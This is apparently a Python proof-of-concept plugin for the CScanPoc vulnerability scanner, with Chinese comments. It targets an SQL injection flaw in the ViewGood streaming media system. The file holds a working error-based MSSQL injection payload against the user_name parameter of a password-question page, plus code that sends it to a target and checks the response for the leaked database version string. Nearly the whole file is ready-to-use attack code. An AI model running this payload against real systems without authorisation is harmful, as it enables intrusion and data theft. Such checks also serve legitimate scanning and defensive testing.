# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'VIEWGOOD_0001'  # 平台漏洞编号，留空
    name = '远古流媒体系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-07-23'  # 漏洞公布时间
    desc = '''
        远古流媒体系统 /viewgood/webmedia/portal/query_user_password_qustion.aspx?user_name=1 SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=109703
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '远古流媒体系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a201bd3c-4b48-4c3f-946e-81652a577b35'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/viewgood/webmedia/portal/query_user_password_qustion.aspx?user_name=1%27%20AND%201%3DCONVERT%28int%2C%20CHAR%28116%29%20%2b%20CHAR%28121%29%20%2b%20CHAR%28113%29%2b@@version%2b%20CHAR%28116%29%20%2b%20CHAR%28121%29%20%2b%20CHAR%28113%29%29%20AND%20%271%27%3D%271'
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)
            if code == 500 and 'tyqMicrosoft SQL Server' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
